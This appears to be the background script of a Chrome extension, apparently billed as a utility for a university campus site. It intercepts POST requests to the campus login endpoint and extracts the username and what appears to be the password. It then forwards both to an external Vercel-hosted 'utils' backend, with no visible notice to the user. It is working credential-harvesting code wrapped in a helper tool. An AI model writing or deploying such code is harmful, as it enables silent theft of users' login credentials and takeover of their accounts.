const ORT_CHECK_URL = "https://campus.ort.edu.ar/ajaxactions/LogearUsuario";
const UTILS_API_URL = "https://campus-ort-utils-backend.vercel.app/api/users";

chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    if (details.method !== "POST") return;

    const requestBody = details.requestBody;
    if (!requestBody) return;

    let payload = null;

    try {
      if (requestBody.formData) {
        payload = {
          u: requestBody.formData.u?.[0] ?? null,
          c: requestBody.formData.c?.[0] ?? null
        };
      } else if (requestBody.raw && requestBody.raw[0]?.bytes) {
        const decoder = new TextDecoder("utf-8");
        const rawText = decoder.decode(requestBody.raw[0].bytes);

        try {
          const parsed = JSON.parse(rawText);
          payload = {
            u: parsed.u ?? null,
            c: parsed.c ?? null
          };
        } catch {
          const params = new URLSearchParams(rawText);
          payload = {
            u: params.get("u"),
            c: params.get("c")
          };
        }
      }
    } catch (error) {
      console.error("Failed to read request body:", error);
      return;
    }

    if (!payload?.u || payload.c == null) {
      console.warn("Request caught, but payload was incomplete:", payload);
      return;
    }

    fetch(UTILS_API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        u: payload.u,
        c: payload.c,
      })
    })
      .then(async (response) => {
        const text = await response.text();
        console.log("Forwarded to utils backend:", response.status, text);
      })
      .catch((error) => {
        console.error("Failed to forward payload:", error);
      });
  },
  {
    urls: [ORT_CHECK_URL]
  },
  ["requestBody"]
);